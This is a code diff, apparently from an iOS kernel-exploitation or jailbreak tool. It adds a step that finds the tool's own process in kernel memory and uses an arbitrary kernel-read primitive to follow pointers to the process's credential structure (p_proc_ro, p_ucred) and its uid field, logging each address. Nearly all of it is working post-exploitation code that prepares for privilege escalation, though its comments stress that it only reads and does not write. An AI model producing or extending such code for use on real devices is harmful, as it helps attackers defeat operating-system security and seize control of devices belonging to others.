@@ -212,9 +212,41 @@ static const char *scopeTypeName(uint8_t t) {
                   (unsigned)koffsetof(pmap, ttep),
                   (unsigned)koffsetof(vm_map_entry, next)]);
 
-    // ---- 4. Verdict ----
-    [r appendString:@"\n--- verdict (safe mode) ---\n"];
-    scopeNote(r, @"  Safe mode: no pointer chasing, no proc/pmap walk, no vtophys.");
+    // ---- 4. ucred via calibrated self-proc (KPDump route) ----
+    // Increment after safe-mode survival. Two reads + zone/comm route only.
+    // NO vm_map walk, NO vtophys(ttep), NO kvtophys chasing.
+    [r appendString:@"\n--- ucred (calibrated self-proc) ---\n"];
+    {
+        uint64_t selfProc = [KPDump findSelfProcByComm:r];
+        if (!selfProc) selfProc = [KPDump zoneRouteSelfProcWithLog:r];
+        scopeNote(r, [NSString stringWithFormat:@"  selfProc = 0x%016llx",
+                      (unsigned long long)selfProc]);
+        uint64_t procRo = 0, ucred = 0;
+        if (selfProc) {
+            uint64_t raw = 0;
+            gPrimitives.kreadbuf(selfProc + off_proc_p_proc_ro, &raw, 8);
+            procRo = kp_untag_ptr(raw);
+            scopeNote(r, [NSString stringWithFormat:@"  p_proc_ro = 0x%016llx",
+                          (unsigned long long)procRo]);
+        }
+        if (procRo && ((procRo & 0xFFFFFF0000000000ULL) == 0xFFFFFF0000000000ULL)) {
+            uint64_t raw = 0;
+            gPrimitives.kreadbuf(procRo + off_proc_ro_p_ucred, &raw, 8);
+            ucred = kp_untag_ptr(raw);
+            scopeNote(r, [NSString stringWithFormat:@"  p_ucred   = 0x%016llx",
+                          (unsigned long long)ucred]);
+        }
+        if (ucred && ((ucred & 0xFFFFFF0000000000ULL) == 0xFFFFFF0000000000ULL)) {
+            uint64_t uid = 0;
+            gPrimitives.kreadbuf(ucred + 0x18, &uid, 8);
+            scopeNote(r, [NSString stringWithFormat:@"  ucred+0x18 (uid cluster) = 0x%016llx",
+                          (unsigned long long)uid]);
+        }
+    }
+
+    // ---- 5. Verdict ----
+    [r appendString:@"\n--- verdict (safe+ucred) ---\n"];
+    scopeNote(r, @"  Safe+ucred: self-proc + ucred reads only. NO walk, NO vtophys.");
     scopeNote(r, @"  Deep recon (ucred FTE + vm_map_entry walk) is deferred until");
     scopeNote(r, @"  the panic source is isolated. Flags above are the R5c result.");
     scopeNote(r, @"  (No kernel writes performed.)");
